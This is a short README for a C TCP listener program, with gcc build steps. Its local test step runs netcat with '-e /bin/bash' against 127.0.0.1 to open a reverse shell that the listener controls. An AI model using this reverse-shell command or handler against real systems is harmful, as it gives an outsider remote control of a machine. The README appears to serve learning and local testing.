# listener-c

This program listens to connections on a specified port and estabilishes a TCP connection to send and recieve data!

Note: this is specifically made to unix systems, if you want to compile this in windows, try cygwin.

Note: Remember to change the PORT define in the code to specify a port.

### Compiling with gcc

```bash
git clone https://github.com/ArthurAMP/listener-c/
cd listener-c
gcc listener.c -o listener
```

### Running the program

```bash
./listener
```

### Testing locally (using netcat)

While running the listener, run this command in another terminal

```
nc 127.0.0.1 8888 -e /bin/bash
```

If all goes well, you will have a reverse shell that you can control on the terminal in which you ran the listener. 

Remember to change 8888 to the port you specified. 
